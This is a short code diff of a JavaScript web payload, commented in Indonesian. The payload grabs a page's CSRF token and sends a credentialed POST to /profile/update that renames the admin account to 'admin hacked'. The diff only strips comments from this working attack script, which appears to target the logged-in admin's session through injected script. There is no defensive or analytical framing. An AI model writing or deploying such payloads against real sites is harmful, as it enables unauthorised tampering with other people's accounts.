@@ -39,19 +39,13 @@
     // Tidak dapat token → tidak lanjut
     if (!csrf) return;
 
-    // ----------------------------------
-    // Buat form-data sesuai request asli
-    // ----------------------------------
     const fd = new FormData();
     fd.append('_token', csrf);
     fd.append('photo', new Blob([], { type: "application/octet-stream" }), "");  
-    fd.append('name', "admin hacked");        // <-- perubahan yang diinginkan
+    fd.append('name', "admin hacked");
     fd.append('email', "admin@themesbrand.com");
     fd.append('phone', "");
-
-    // ---------------------------------------------
-    // Kirim POST ke /profile/update (AJAX sama persis)
-    // ---------------------------------------------
+    
     fetch("/profile/update", {
         method: "POST",
         credentials: "include",
